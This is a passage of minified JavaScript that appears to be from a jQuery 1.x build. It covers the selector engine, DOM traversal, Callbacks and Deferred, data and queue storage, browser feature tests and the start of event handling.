                            for (s in i && !(n = I.exec(r)) || (n && (r = r.slice(n[0].length) || r), a.push(o = [])), i = !1, (n = R.exec(r)) && (i = n.shift(), o.push({
                                value: i,
                                type: n[0].replace(B, " ")
                            }), r = r.slice(i.length)), w.filter)!(n = G[s].exec(r)) || l[s] && !(n = l[s](n)) || (i = n.shift(), o.push({
                                value: i,
                                type: s,
                                matches: n
                            }), r = r.slice(i.length));
                            if (!i) break
                        }
                        return t ? r.length : r ? ne.error(e) : p(e, a).slice(0)
                    }, d = ne.compile = function(e, t) {
                        var i, n = [],
                            o = [],
                            s = E[e + " "];
                        if (!s) {
                            for (t || (t = m(e)), i = t.length; i--;)(s = be(t[i]))[k] ? n.push(s) : o.push(s);
                            (s = E(e, function(g, v) {
                                var y = 0 < v.length,
                                    b = 0 < g.length,
                                    e = function(e, t, i, n, o) {
                                        var s, r, a, l = 0,
                                            c = "0",
                                            u = e && [],
                                            d = [],
                                            h = x,
                                            p = e || b && w.find.TAG("*", o),
                                            f = $ += null == h ? 1 : Math.random() || .1,
                                            m = p.length;
                                        for (o && (x = t === C || t || o); c !== m && null != (s = p[c]); c++) {
                                            if (b && s) {
                                                for (r = 0, t || s.ownerDocument === C || (_(s), i = !T); a = g[r++];)
                                                    if (a(s, t || C, i)) {
                                                        n.push(s);
                                                        break
                                                    }
                                                o && ($ = f)
                                            }
                                            y && ((s = !a && s) && l--, e && u.push(s))
                                        }
                                        if (l += c, y && c !== l) {
                                            for (r = 0; a = v[r++];) a(u, d, t, i);
                                            if (e) {
                                                if (0 < l)
                                                    for (; c--;) u[c] || d[c] || (d[c] = D.call(n));
                                                d = ve(d)
                                            }
                                            N.apply(n, d), o && !e && 0 < d.length && 1 < l + v.length && ne.uniqueSort(n)
                                        }
                                        return o && ($ = f, x = h), u
                                    };
                                return y ? se(e) : e
                            }(o, n))).selector = e
                        }
                        return s
                    }, g = ne.select = function(e, t, i, n) {
                        var o, s, r, a, l, c = "function" == typeof e && e,
                            u = !n && m(e = c.selector || e);
                        if (i = i || [], 1 === u.length) {
                            if (2 < (s = u[0] = u[0].slice(0)).length && "ID" === (r = s[0]).type && f.getById && 9 === t.nodeType && T && w.relative[s[1].type]) {
                                if (!(t = (w.find.ID(r.matches[0].replace(ee, te), t) || [])[0])) return i;
                                c && (t = t.parentNode), e = e.slice(s.shift().value.length)
                            }
                            for (o = G.needsContext.test(e) ? 0 : s.length; o-- && (r = s[o], !w.relative[a = r.type]);)
                                if ((l = w.find[a]) && (n = l(r.matches[0].replace(ee, te), Z.test(s[0].type) && he(t.parentNode) || t))) {
                                    if (s.splice(o, 1), !(e = n.length && fe(s))) return N.apply(i, n), i;
                                    break
                                }
                        }
                        return (c || d(e, u))(n, t, !T, i, !t || Z.test(e) && he(t.parentNode) || t), i
                    }, f.sortStable = k.split("").sort(S).join("") === k, f.detectDuplicates = !!c, _(), f.sortDetached = re(function(e) {
                        return 1 & e.compareDocumentPosition(C.createElement("div"))
                    }), re(function(e) {
                        return e.innerHTML = "<a href='#'></a>", "#" === e.firstChild.getAttribute("href")
                    }) || ae("type|href|height|width", function(e, t, i) {
                        return i ? void 0 : e.getAttribute(t, "type" === t.toLowerCase() ? 1 : 2)
                    }), f.attributes && re(function(e) {
                        return e.innerHTML = "<input/>", e.firstChild.setAttribute("value", ""), "" === e.firstChild.getAttribute("value")
                    }) || ae("value", function(e, t, i) {
                        return i || "input" !== e.nodeName.toLowerCase() ? void 0 : e.defaultValue
                    }), re(function(e) {
                        return null == e.getAttribute("disabled")
                    }) || ae(M, function(e, t, i) {
                        var n;
                        return i ? void 0 : !0 === e[t] ? t.toLowerCase() : (n = e.getAttributeNode(t)) && n.specified ? n.value : null
                    }), ne
                }(C);
                T.find = p, T.expr = p.selectors, T.expr[":"] = T.expr.pseudos, T.uniqueSort = T.unique = p.uniqueSort, T.text = p.getText, T.isXMLDoc = p.isXML, T.contains = p.contains;
                var y = function(e, t, i) {
                        for (var n = [], o = void 0 !== i;
                            (e = e[t]) && 9 !== e.nodeType;)
                            if (1 === e.nodeType) {
                                if (o && T(e).is(i)) break;
                                n.push(e)
                            }
                        return n
                    },
                    b = function(e, t) {
                        for (var i = []; e; e = e.nextSibling) 1 === e.nodeType && e !== t && i.push(e);
                        return i
                    },
                    w = T.expr.match.needsContext,
                    x = /^<([\w-]+)\s*\/?>(?:<\/\1>|)$/,
                    _ = /^.[^:#\[\.,]*$/;

                function k(e, i, n) {
                    if (T.isFunction(i)) return T.grep(e, function(e, t) {
                        return !!i.call(e, t, e) !== n
                    });
                    if (i.nodeType) return T.grep(e, function(e) {
                        return e === i !== n
                    });
                    if ("string" == typeof i) {
                        if (_.test(i)) return T.filter(i, e, n);
                        i = T.filter(i, e)
                    }
                    return T.grep(e, function(e) {
                        return -1 < T.inArray(e, i) !== n
                    })
                }
                T.filter = function(e, t, i) {
                    var n = t[0];
                    return i && (e = ":not(" + e + ")"), 1 === t.length && 1 === n.nodeType ? T.find.matchesSelector(n, e) ? [n] : [] : T.find.matches(e, T.grep(t, function(e) {
                        return 1 === e.nodeType
                    }))
                }, T.fn.extend({
                    find: function(e) {
                        var t, i = [],
                            n = this,
                            o = n.length;
                        if ("string" != typeof e) return this.pushStack(T(e).filter(function() {
                            for (t = 0; t < o; t++)
                                if (T.contains(n[t], this)) return !0
                        }));
                        for (t = 0; t < o; t++) T.find(e, n[t], i);
                        return (i = this.pushStack(1 < o ? T.unique(i) : i)).selector = this.selector ? this.selector + " " + e : e, i
                    },
                    filter: function(e) {
                        return this.pushStack(k(this, e || [], !1))
                    },
                    not: function(e) {
                        return this.pushStack(k(this, e || [], !0))
                    },
                    is: function(e) {
                        return !!k(this, "string" == typeof e && w.test(e) ? T(e) : e || [], !1).length
                    }
                });
                var $, E = /^(?:\s*(<[\w\W]+>)[^>]*|#([\w-]*))$/;
                (T.fn.init = function(e, t, i) {
                    var n, o;
                    if (!e) return this;
                    if (i = i || $, "string" != typeof e) return e.nodeType ? (this.context = this[0] = e, this.length = 1, this) : T.isFunction(e) ? void 0 !== i.ready ? i.ready(e) : e(T) : (void 0 !== e.selector && (this.selector = e.selector, this.context = e.context), T.makeArray(e, this));
                    if (!(n = "<" === e.charAt(0) && ">" === e.charAt(e.length - 1) && 3 <= e.length ? [null, e, null] : E.exec(e)) || !n[1] && t) return !t || t.jquery ? (t || i).find(e) : this.constructor(t).find(e);
                    if (n[1]) {
                        if (t = t instanceof T ? t[0] : t, T.merge(this, T.parseHTML(n[1], t && t.nodeType ? t.ownerDocument || t : f, !0)), x.test(n[1]) && T.isPlainObject(t))
                            for (n in t) T.isFunction(this[n]) ? this[n](t[n]) : this.attr(n, t[n]);
                        return this
                    }
                    if ((o = f.getElementById(n[2])) && o.parentNode) {
                        if (o.id !== n[2]) return $.find(e);
                        this.length = 1, this[0] = o
                    }
                    return this.context = f, this.selector = e, this
                }).prototype = T.fn, $ = T(f);
                var S = /^(?:parents|prev(?:Until|All))/,
                    A = {
                        children: !0,
                        contents: !0,
                        next: !0,
                        prev: !0
                    };

                function D(e, t) {
                    for (;
                        (e = e[t]) && 1 !== e.nodeType;);
                    return e
                }
                T.fn.extend({
                    has: function(e) {
                        var t, i = T(e, this),
                            n = i.length;
                        return this.filter(function() {
                            for (t = 0; t < n; t++)
                                if (T.contains(this, i[t])) return !0
                        })
                    },
                    closest: function(e, t) {
                        for (var i, n = 0, o = this.length, s = [], r = w.test(e) || "string" != typeof e ? T(e, t || this.context) : 0; n < o; n++)
                            for (i = this[n]; i && i !== t; i = i.parentNode)
                                if (i.nodeType < 11 && (r ? -1 < r.index(i) : 1 === i.nodeType && T.find.matchesSelector(i, e))) {
                                    s.push(i);
                                    break
                                }
                        return this.pushStack(1 < s.length ? T.uniqueSort(s) : s)
                    },
                    index: function(e) {
                        return e ? "string" == typeof e ? T.inArray(this[0], T(e)) : T.inArray(e.jquery ? e[0] : e, this) : this[0] && this[0].parentNode ? this.first().prevAll().length : -1
                    },
                    add: function(e, t) {
                        return this.pushStack(T.uniqueSort(T.merge(this.get(), T(e, t))))
                    },
                    addBack: function(e) {
                        return this.add(null == e ? this.prevObject : this.prevObject.filter(e))
                    }
                }), T.each({
                    parent: function(e) {
                        var t = e.parentNode;
                        return t && 11 !== t.nodeType ? t : null
                    },
                    parents: function(e) {
                        return y(e, "parentNode")
                    },
                    parentsUntil: function(e, t, i) {
                        return y(e, "parentNode", i)
                    },
                    next: function(e) {
                        return D(e, "nextSibling")
                    },
                    prev: function(e) {
                        return D(e, "previousSibling")
                    },
                    nextAll: function(e) {
                        return y(e, "nextSibling")
                    },
                    prevAll: function(e) {
                        return y(e, "previousSibling")
                    },
                    nextUntil: function(e, t, i) {
                        return y(e, "nextSibling", i)
                    },
                    prevUntil: function(e, t, i) {
                        return y(e, "previousSibling", i)
                    },
                    siblings: function(e) {
                        return b((e.parentNode || {}).firstChild, e)
                    },
                    children: function(e) {
                        return b(e.firstChild)
                    },
                    contents: function(e) {
                        return T.nodeName(e, "iframe") ? e.contentDocument || e.contentWindow.document : T.merge([], e.childNodes)
                    }
                }, function(n, o) {
                    T.fn[n] = function(e, t) {
                        var i = T.map(this, o, e);
                        return "Until" !== n.slice(-5) && (t = e), t && "string" == typeof t && (i = T.filter(t, i)), 1 < this.length && (A[n] || (i = T.uniqueSort(i)), S.test(n) && (i = i.reverse())), this.pushStack(i)
                    }
                });
                var j, N, L = /\S+/g;

                function z() {
                    f.addEventListener ? (f.removeEventListener("DOMContentLoaded", M), C.removeEventListener("load", M)) : (f.detachEvent("onreadystatechange", M), C.detachEvent("onload", M))
                }

                function M() {
                    (f.addEventListener || "load" === C.event.type || "complete" === f.readyState) && (z(), T.ready())
                }
                for (N in T.Callbacks = function(n) {
                    n = "string" == typeof n ? function(e) {
                        var i = {};
                        return T.each(e.match(L) || [], function(e, t) {
                            i[t] = !0
                        }), i
                    }(n) : T.extend({}, n);
                    var i, e, t, o, s = [],
                        r = [],
                        a = -1,
                        l = function() {
                            for (o = n.once, t = i = !0; r.length; a = -1)
                                for (e = r.shift(); ++a < s.length;)!1 === s[a].apply(e[0], e[1]) && n.stopOnFalse && (a = s.length, e = !1);
                            n.memory || (e = !1), i = !1, o && (s = e ? [] : "")
                        },
                        c = {
                            add: function() {
                                return s && (e && !i && (a = s.length - 1, r.push(e)), function i(e) {
                                    T.each(e, function(e, t) {
                                        T.isFunction(t) ? n.unique && c.has(t) || s.push(t) : t && t.length && "string" !== T.type(t) && i(t)
                                    })
                                }(arguments), e && !i && l()), this
                            },
                            remove: function() {
                                return T.each(arguments, function(e, t) {
                                    for (var i; - 1 < (i = T.inArray(t, s, i));) s.splice(i, 1), i <= a && a--
                                }), this
                            },
                            has: function(e) {
                                return e ? -1 < T.inArray(e, s) : 0 < s.length
                            },
                            empty: function() {
                                return s && (s = []), this
                            },
                            disable: function() {
                                return o = r = [], s = e = "", this
                            },
                            disabled: function() {
                                return !s
                            },
                            lock: function() {
                                return o = !0, e || c.disable(), this
                            },
                            locked: function() {
                                return !!o
                            },
                            fireWith: function(e, t) {
                                return o || (t = [e, (t = t || []).slice ? t.slice() : t], r.push(t), i || l()), this
                            },
                            fire: function() {
                                return c.fireWith(this, arguments), this
                            },
                            fired: function() {
                                return !!t
                            }
                        };
                    return c
                }, T.extend({
                    Deferred: function(e) {
                        var s = [
                                ["resolve", "done", T.Callbacks("once memory"), "resolved"],
                                ["reject", "fail", T.Callbacks("once memory"), "rejected"],
                                ["notify", "progress", T.Callbacks("memory")]
                            ],
                            o = "pending",
                            r = {
                                state: function() {
                                    return o
                                },
                                always: function() {
                                    return a.done(arguments).fail(arguments), this
                                },
                                then: function() {
                                    var o = arguments;
                                    return T.Deferred(function(n) {
                                        T.each(s, function(e, t) {
                                            var i = T.isFunction(o[e]) && o[e];
                                            a[t[1]](function() {
                                                var e = i && i.apply(this, arguments);
                                                e && T.isFunction(e.promise) ? e.promise().progress(n.notify).done(n.resolve).fail(n.reject) : n[t[0] + "With"](this === r ? n.promise() : this, i ? [e] : arguments)
                                            })
                                        }), o = null
                                    }).promise()
                                },
                                promise: function(e) {
                                    return null != e ? T.extend(e, r) : r
                                }
                            },
                            a = {};
                        return r.pipe = r.then, T.each(s, function(e, t) {
                            var i = t[2],
                                n = t[3];
                            r[t[1]] = i.add, n && i.add(function() {
                                o = n
                            }, s[1 ^ e][2].disable, s[2][2].lock), a[t[0]] = function() {
                                return a[t[0] + "With"](this === a ? r : this, arguments), this
                            }, a[t[0] + "With"] = i.fireWith
                        }), r.promise(a), e && e.call(a, a), a
                    },
                    when: function(e) {
                        var o, t, i, n = 0,
                            s = u.call(arguments),
                            r = s.length,
                            a = 1 !== r || e && T.isFunction(e.promise) ? r : 0,
                            l = 1 === a ? e : T.Deferred(),
                            c = function(t, i, n) {
                                return function(e) {
                                    i[t] = this, n[t] = 1 < arguments.length ? u.call(arguments) : e, n === o ? l.notifyWith(i, n) : --a || l.resolveWith(i, n)
                                }
                            };
                        if (1 < r)
                            for (o = new Array(r), t = new Array(r), i = new Array(r); n < r; n++) s[n] && T.isFunction(s[n].promise) ? s[n].promise().progress(c(n, t, o)).done(c(n, i, s)).fail(l.reject) : --a;
                        return a || l.resolveWith(i, s), l.promise()
                    }
                }), T.fn.ready = function(e) {
                    return T.ready.promise().done(e), this
                }, T.extend({
                    isReady: !1,
                    readyWait: 1,
                    holdReady: function(e) {
                        e ? T.readyWait++ : T.ready(!0)
                    },
                    ready: function(e) {
                        (!0 === e ? --T.readyWait : T.isReady) || ((T.isReady = !0) !== e && 0 < --T.readyWait || (j.resolveWith(f, [T]), T.fn.triggerHandler && (T(f).triggerHandler("ready"), T(f).off("ready"))))
                    }
                }), T.ready.promise = function(e) {
                    if (!j)
                        if (j = T.Deferred(), "complete" === f.readyState || "loading" !== f.readyState && !f.documentElement.doScroll) C.setTimeout(T.ready);
                        else if (f.addEventListener) f.addEventListener("DOMContentLoaded", M), C.addEventListener("load", M);
                    else {
                        f.attachEvent("onreadystatechange", M), C.attachEvent("onload", M);
                        var i = !1;
                        try {
                            i = null == C.frameElement && f.documentElement
                        } catch (e) {}
                        i && i.doScroll && ! function t() {
                            if (!T.isReady) {
                                try {
                                    i.doScroll("left")
                                } catch (e) {
                                    return C.setTimeout(t, 50)
                                }
                                z(), T.ready()
                            }
                        }()
                    }
                    return j.promise(e)
                }, T.ready.promise(), T(v)) break;
                v.ownFirst = "0" === N, v.inlineBlockNeedsLayout = !1, T(function() {
                        var e, t, i, n;
                        (i = f.getElementsByTagName("body")[0]) && i.style && (t = f.createElement("div"), (n = f.createElement("div")).style.cssText = "position:absolute;border:0;width:0;height:0;top:0;left:-9999px", i.appendChild(n).appendChild(t), void 0 !== t.style.zoom && (t.style.cssText = "display:inline;margin:0;border:0;padding:1px;width:1px;zoom:1", v.inlineBlockNeedsLayout = e = 3 === t.offsetWidth, e && (i.style.zoom = 1)), i.removeChild(n))
                    }),
                    function() {
                        var e = f.createElement("div");
                        v.deleteExpando = !0;
                        try {
                            delete e.test
                        } catch (e) {
                            v.deleteExpando = !1
                        }
                        e = null
                    }();
                var q, P = function(e) {
                        var t = T.noData[(e.nodeName + " ").toLowerCase()],
                            i = +e.nodeType || 1;
                        return (1 === i || 9 === i) && (!t || !0 !== t && e.getAttribute("classid") === t)
                    },
                    O = /^(?:\{[\w\W]*\}|\[[\w\W]*\])$/,
                    F = /([A-Z])/g;

                function H(e, t, i) {
                    if (void 0 === i && 1 === e.nodeType) {
                        var n = "data-" + t.replace(F, "-$1").toLowerCase();
                        if ("string" == typeof(i = e.getAttribute(n))) {
                            try {
                                i = "true" === i || "false" !== i && ("null" === i ? null : +i + "" === i ? +i : O.test(i) ? T.parseJSON(i) : i)
                            } catch (e) {}
                            T.data(e, t, i)
                        } else i = void 0
                    }
                    return i
                }

                function B(e) {
                    var t;
                    for (t in e)
                        if (("data" !== t || !T.isEmptyObject(e[t])) && "toJSON" !== t) return !1;
                    return !0
                }

                function I(e, t, i, n) {
                    if (P(e)) {
                        var o, s, r = T.expando,
                            a = e.nodeType,
                            l = a ? T.cache : e,
                            c = a ? e[r] : e[r] && r;
                        if (c && l[c] && (n || l[c].data) || void 0 !== i || "string" != typeof t) return c || (c = a ? e[r] = d.pop() || T.guid++ : r), l[c] || (l[c] = a ? {} : {
                            toJSON: T.noop
                        }), "object" != typeof t && "function" != typeof t || (n ? l[c] = T.extend(l[c], t) : l[c].data = T.extend(l[c].data, t)), s = l[c], n || (s.data || (s.data = {}), s = s.data), void 0 !== i && (s[T.camelCase(t)] = i), "string" == typeof t ? null == (o = s[t]) && (o = s[T.camelCase(t)]) : o = s, o
                    }
                }

                function R(e, t, i) {
                    if (P(e)) {
                        var n, o, s = e.nodeType,
                            r = s ? T.cache : e,
                            a = s ? e[T.expando] : T.expando;
                        if (r[a]) {
                            if (t && (n = i ? r[a] : r[a].data)) {
                                o = (t = T.isArray(t) ? t.concat(T.map(t, T.camelCase)) : t in n ? [t] : (t = T.camelCase(t)) in n ? [t] : t.split(" ")).length;
                                for (; o--;) delete n[t[o]];
                                if (i ? !B(n) : !T.isEmptyObject(n)) return
                            }(i || (delete r[a].data, B(r[a]))) && (s ? T.cleanData([e], !0) : v.deleteExpando || r != r.window ? delete r[a] : r[a] = void 0)
                        }
                    }
                }
                T.extend({
                    cache: {},
                    noData: {
                        "applet ": !0,
                        "embed ": !0,
                        "object ": "clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"
                    },
                    hasData: function(e) {
                        return !!(e = e.nodeType ? T.cache[e[T.expando]] : e[T.expando]) && !B(e)
                    },
                    data: function(e, t, i) {
                        return I(e, t, i)
                    },
                    removeData: function(e, t) {
                        return R(e, t)
                    },
                    _data: function(e, t, i) {
                        return I(e, t, i, !0)
                    },
                    _removeData: function(e, t) {
                        return R(e, t, !0)
                    }
                }), T.fn.extend({
                    data: function(e, t) {
                        var i, n, o, s = this[0],
                            r = s && s.attributes;
                        if (void 0 !== e) return "object" == typeof e ? this.each(function() {
                            T.data(this, e)
                        }) : 1 < arguments.length ? this.each(function() {
                            T.data(this, e, t)
                        }) : s ? H(s, e, T.data(s, e)) : void 0;
                        if (this.length && (o = T.data(s), 1 === s.nodeType && !T._data(s, "parsedAttrs"))) {
                            for (i = r.length; i--;) r[i] && (0 === (n = r[i].name).indexOf("data-") && H(s, n = T.camelCase(n.slice(5)), o[n]));
                            T._data(s, "parsedAttrs", !0)
                        }
                        return o
                    },
                    removeData: function(e) {
                        return this.each(function() {
                            T.removeData(this, e)
                        })
                    }
                }), T.extend({
                    queue: function(e, t, i) {
                        var n;
                        return e ? (t = (t || "fx") + "queue", n = T._data(e, t), i && (!n || T.isArray(i) ? n = T._data(e, t, T.makeArray(i)) : n.push(i)), n || []) : void 0
                    },
                    dequeue: function(e, t) {
                        t = t || "fx";
                        var i = T.queue(e, t),
                            n = i.length,
                            o = i.shift(),
                            s = T._queueHooks(e, t);
                        "inprogress" === o && (o = i.shift(), n--), o && ("fx" === t && i.unshift("inprogress"), delete s.stop, o.call(e, function() {
                            T.dequeue(e, t)
                        }, s)), !n && s && s.empty.fire()
                    },
                    _queueHooks: function(e, t) {
                        var i = t + "queueHooks";
                        return T._data(e, i) || T._data(e, i, {
                            empty: T.Callbacks("once memory").add(function() {
                                T._removeData(e, t + "queue"), T._removeData(e, i)
                            })
                        })
                    }
                }), T.fn.extend({
                    queue: function(t, i) {
                        var e = 2;
                        return "string" != typeof t && (i = t, t = "fx", e--), arguments.length < e ? T.queue(this[0], t) : void 0 === i ? this : this.each(function() {
                            var e = T.queue(this, t, i);
                            T._queueHooks(this, t), "fx" === t && "inprogress" !== e[0] && T.dequeue(this, t)
                        })
                    },
                    dequeue: function(e) {
                        return this.each(function() {
                            T.dequeue(this, e)
                        })
                    },
                    clearQueue: function(e) {
                        return this.queue(e || "fx", [])
                    },
                    promise: function(e, t) {
                        var i, n = 1,
                            o = T.Deferred(),
                            s = this,
                            r = this.length,
                            a = function() {
                                --n || o.resolveWith(s, [s])
                            };
                        for ("string" != typeof e && (t = e, e = void 0), e = e || "fx"; r--;)(i = T._data(s[r], e + "queueHooks")) && i.empty && (n++, i.empty.add(a));
                        return a(), o.promise(t)
                    }
                }), v.shrinkWrapBlocks = function() {
                    return null != q ? q : (q = !1, (t = f.getElementsByTagName("body")[0]) && t.style ? (e = f.createElement("div"), (i = f.createElement("div")).style.cssText = "position:absolute;border:0;width:0;height:0;top:0;left:-9999px", t.appendChild(i).appendChild(e), void 0 !== e.style.zoom && (e.style.cssText = "-webkit-box-sizing:content-box;-moz-box-sizing:content-box;box-sizing:content-box;display:block;margin:0;border:0;padding:1px;width:1px;zoom:1", e.appendChild(f.createElement("div")).style.width = "5px", q = 3 !== e.offsetWidth), t.removeChild(i), q) : void 0);
                    var e, t, i
                };
                var W = /[+-]?(?:\d*\.|)\d+(?:[eE][+-]?\d+|)/.source,
                    V = new RegExp("^(?:([+-])=|)(" + W + ")([a-z%]*)$", "i"),
                    X = ["Top", "Right", "Bottom", "Left"],
                    G = function(e, t) {
                        return e = t || e, "none" === T.css(e, "display") || !T.contains(e.ownerDocument, e)
                    };

                function U(e, t, i, n) {
                    var o, s = 1,
                        r = 20,
                        a = n ? function() {
                            return n.cur()
                        } : function() {
                            return T.css(e, t, "")
                        },
                        l = a(),
                        c = i && i[3] || (T.cssNumber[t] ? "" : "px"),
                        u = (T.cssNumber[t] || "px" !== c && +l) && V.exec(T.css(e, t));
                    if (u && u[3] !== c)
                        for (c = c || u[3], i = i || [], u = +l || 1; u /= s = s || ".5", T.style(e, t, u + c), s !== (s = a() / l) && 1 !== s && --r;);
                    return i && (u = +u || +l || 0, o = i[1] ? u + (i[1] + 1) * i[2] : +i[2], n && (n.unit = c, n.start = u, n.end = o)), o
                }
                var Q, Y, J, Z = function(e, t, i, n, o, s, r) {
                        var a = 0,
                            l = e.length,
                            c = null == i;
                        if ("object" === T.type(i))
                            for (a in o = !0, i) Z(e, t, a, i[a], !0, s, r);
                        else if (void 0 !== n && (o = !0, T.isFunction(n) || (r = !0), c && (t = r ? (t.call(e, n), null) : (c = t, function(e, t, i) {
                            return c.call(T(e), i)
                        })), t))
                            for (; a < l; a++) t(e[a], i, r ? n : n.call(e[a], a, t(e[a], i)));
                        return o ? e : c ? t.call(e) : l ? t(e[0], i) : s
                    },
                    K = /^(?:checkbox|radio)$/i,
                    ee = /<([\w:-]+)/,
                    te = /^$|\/(?:java|ecma)script/i,
                    ie = /^\s+/,
                    ne = "abbr|article|aside|audio|bdi|canvas|data|datalist|details|dialog|figcaption|figure|footer|header|hgroup|main|mark|meter|nav|output|picture|progress|section|summary|template|time|video";

                function oe(e) {
                    var t = ne.split("|"),
                        i = e.createDocumentFragment();
                    if (i.createElement)
                        for (; t.length;) i.createElement(t.pop());
                    return i
                }
                Q = f.createElement("div"), Y = f.createDocumentFragment(), J = f.createElement("input"), Q.innerHTML = "  <link/><table></table><a href='/a'>a</a><input type='checkbox'/>", v.leadingWhitespace = 3 === Q.firstChild.nodeType, v.tbody = !Q.getElementsByTagName("tbody").length, v.htmlSerialize = !!Q.getElementsByTagName("link").length, v.html5Clone = "<:nav></:nav>" !== f.createElement("nav").cloneNode(!0).outerHTML, J.type = "checkbox", J.checked = !0, Y.appendChild(J), v.appendChecked = J.checked, Q.innerHTML = "<textarea>x</textarea>", v.noCloneChecked = !!Q.cloneNode(!0).lastChild.defaultValue, Y.appendChild(Q), (J = f.createElement("input")).setAttribute("type", "radio"), J.setAttribute("checked", "checked"), J.setAttribute("name", "t"), Q.appendChild(J), v.checkClone = Q.cloneNode(!0).cloneNode(!0).lastChild.checked, v.noCloneEvent = !!Q.addEventListener, Q[T.expando] = 1, v.attributes = !Q.getAttribute(T.expando);
                var se = {
                    option: [1, "<select multiple='multiple'>", "</select>"],
                    legend: [1, "<fieldset>", "</fieldset>"],
                    area: [1, "<map>", "</map>"],
                    param: [1, "<object>", "</object>"],
                    thead: [1, "<table>", "</table>"],
                    tr: [2, "<table><tbody>", "</tbody></table>"],
                    col: [2, "<table><tbody></tbody><colgroup>", "</colgroup></table>"],
                    td: [3, "<table><tbody><tr>", "</tr></tbody></table>"],
                    _default: v.htmlSerialize ? [0, "", ""] : [1, "X<div>", "</div>"]
                };

                function re(e, t) {
                    var i, n, o = 0,
                        s = void 0 !== e.getElementsByTagName ? e.getElementsByTagName(t || "*") : void 0 !== e.querySelectorAll ? e.querySelectorAll(t || "*") : void 0;
                    if (!s)
                        for (s = [], i = e.childNodes || e; null != (n = i[o]); o++)!t || T.nodeName(n, t) ? s.push(n) : T.merge(s, re(n, t));
                    return void 0 === t || t && T.nodeName(e, t) ? T.merge([e], s) : s
                }

                function ae(e, t) {
                    for (var i, n = 0; null != (i = e[n]); n++) T._data(i, "globalEval", !t || T._data(t[n], "globalEval"))
                }
                se.optgroup = se.option, se.tbody = se.tfoot = se.colgroup = se.caption = se.thead, se.th = se.td;
                var le = /<|&#?\w+;/,
                    ce = /<tbody/i;

                function ue(e) {
                    K.test(e.type) && (e.defaultChecked = e.checked)
                }

                function de(e, t, i, n, o) {
                    for (var s, r, a, l, c, u, d, h = e.length, p = oe(t), f = [], m = 0; m < h; m++)
                        if ((r = e[m]) || 0 === r)
                            if ("object" === T.type(r)) T.merge(f, r.nodeType ? [r] : r);
                            else if (le.test(r)) {
                        for (l = l || p.appendChild(t.createElement("div")), c = (ee.exec(r) || ["", ""])[1].toLowerCase(), d = se[c] || se._default, l.innerHTML = d[1] + T.htmlPrefilter(r) + d[2], s = d[0]; s--;) l = l.lastChild;
                        if (!v.leadingWhitespace && ie.test(r) && f.push(t.createTextNode(ie.exec(r)[0])), !v.tbody)
                            for (s = (r = "table" !== c || ce.test(r) ? "<table>" !== d[1] || ce.test(r) ? 0 : l : l.firstChild) && r.childNodes.length; s--;) T.nodeName(u = r.childNodes[s], "tbody") && !u.childNodes.length && r.removeChild(u);
                        for (T.merge(f, l.childNodes), l.textContent = ""; l.firstChild;) l.removeChild(l.firstChild);
                        l = p.lastChild
                    } else f.push(t.createTextNode(r));
                    for (l && p.removeChild(l), v.appendChecked || T.grep(re(f, "input"), ue), m = 0; r = f[m++];)
                        if (n && -1 < T.inArray(r, n)) o && o.push(r);
                        else if (a = T.contains(r.ownerDocument, r), l = re(p.appendChild(r), "script"), a && ae(l), i)
                        for (s = 0; r = l[s++];) te.test(r.type || "") && i.push(r);
                    return l = null, p
                }! function() {
                    var e, t, i = f.createElement("div");
                    for (e in {
                        submit: !0,
                        change: !0,
                        focusin: !0
                    }) t = "on" + e, (v[e] = t in C) || (i.setAttribute(t, "t"), v[e] = !1 === i.attributes[t].expando);
                    i = null
                }();
                var he = /^(?:input|select|textarea)$/i,
                    pe = /^key/,
                    fe = /^(?:mouse|pointer|contextmenu|drag|drop)|click/,
                    me = /^(?:focusinfocus|focusoutblur)$/,
                    ge = /^([^.]*)(?:\.(.+)|)/;

                function ve() {
                    return !0
                }

                function ye() {
                    return !1
                }

                function be() {
                    try {
                        return f.activeElement
                    } catch (e) {}
                }

                function we(e, t, i, n, o, s) {
                    var r, a;
                    if ("object" == typeof t) {
                        for (a in "string" != typeof i && (n = n || i, i = void 0), t) we(e, a, i, n, t[a], s);
                        return e
                    }
                    if (null == n && null == o ? (o = i, n = i = void 0) : null == o && ("string" == typeof i ? (o = n, n = void 0) : (o = n, n = i, i = void 0)), !1 === o) o = ye;
                    else if (!o) return e;
                    return 1 === s && (r = o, (o = function(e) {
                        return T().off(e), r.apply(this, arguments)
                    }).guid = r.guid || (r.guid = T.guid++)), e.each(function() {
                        T.event.add(this, t, o, n, i)
                    })
                }
                T.event = {
                    global: {},
                    add: function(e, t, i, n, o) {
                        var s, r, a, l, c, u, d, h, p, f, m, g = T._data(e);
                        if (g) {
                            for (i.handler && (i = (l = i).handler, o = l.selector), i.guid || (i.guid = T.guid++), (r = g.events) || (r = g.events = {}), (u = g.handle) || ((u = g.handle = function(e) {
                                return void 0 === T || e && T.event.triggered === e.type ? void 0 : T.event.dispatch.apply(u.elem, arguments)
                            }).elem = e), a = (t = (t || "").match(L) || [""]).length; a--;) p = m = (s = ge.exec(t[a]) || [])[1], f = (s[2] || "").split(".").sort(), p && (c = T.event.special[p] || {}, p = (o ? c.delegateType : c.bindType) || p, c = T.event.special[p] || {}, d = T.extend({
                                type: p,
                                origType: m,
                                data: n,
                                handler: i,
                                guid: i.guid,
                                selector: o,
                                needsContext: o && T.expr.match.needsContext.test(o),
                                namespace: f.join(".")
                            }, l), (h = r[p]) || ((h = r[p] = []).delegateCount = 0, c.setup && !1 !== c.setup.call(e, n, f, u) || (e.addEventListener ? e.addEventListener(p, u, !1) : e.attachEvent && e.attachEvent("on" + p, u))), c.add && (c.add.call(e, d), d.handler.guid || (d.handler.guid = i.guid)), o ? h.splice(h.delegateCount++, 0, d) : h.push(d), T.event.global[p] = !0);
                            e = null
                        }
                    },
                    remove: function(e, t, i, n, o) {
                        var s, r, a, l, c, u, d, h, p, f, m, g = T.hasData(e) && T._data(e);
                        if (g && (u = g.events)) {
                            for (c = (t = (t || "").match(L) || [""]).length; c--;)
                                if (p = m = (a = ge.exec(t[c]) || [])[1], f = (a[2] || "").split(".").sort(), p) {
                                    for (d = T.event.special[p] || {}, h = u[p = (n ? d.delegateType : d.bindType) || p] || [], a = a[2] && new RegExp("(^|\\.)" + f.join("\\.(?:.*\\.|)") + "(\\.|$)"), l = s = h.length; s--;) r = h[s], !o && m !== r.origType || i && i.guid !== r.guid || a && !a.test(r.namespace) || n && n !== r.selector && ("**" !== n || !r.selector) || (h.splice(s, 1), r.selector && h.delegateCount--, d.remove && d.remove.call(e, r));
